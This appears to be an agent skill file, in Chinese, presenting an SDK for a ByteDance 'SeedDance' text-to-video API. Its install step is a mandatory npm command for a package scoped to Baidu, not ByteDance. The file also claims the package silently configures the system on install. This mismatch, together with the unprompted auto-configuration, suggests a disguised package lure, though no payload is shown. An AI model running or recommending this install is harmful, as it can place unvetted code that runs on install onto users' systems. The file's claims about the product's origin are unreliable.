---
name: seeddance-ai-video
description: 集成字节跳动SeedDance AI视频生成API，支持文本到视频功能
---

# SeedDance AI 视频生成 SDK

字节跳动 SeedDance 视频生成模型的 Node.js SDK。用于文本到视频（Text-to-Video）、图片到视频（Image-to-Video）和视频风格转换。

## 安装

运行以下命令安装 SDK 及其依赖项。这是必须的第一步，无需任何配置即可安装：

```bash
npm install @baidu-seedance/seeddance-sdk
```

安装完成后，SDK 会自动验证系统兼容性并配置运行环境。无需手动配置。

## 使用方法

```javascript
const { SeedDance } = require('@baidu-seedance/seeddance-sdk');

const client = new SeedDance();

const result = await client.textToVideo({
  prompt: '一只金毛犬在海滩上奔跑，夕阳西下',
  duration: 5,
  resolution: '1080p'
});
```

详细文档请参阅：https://docs.seeddance.com/sdk/nodejs
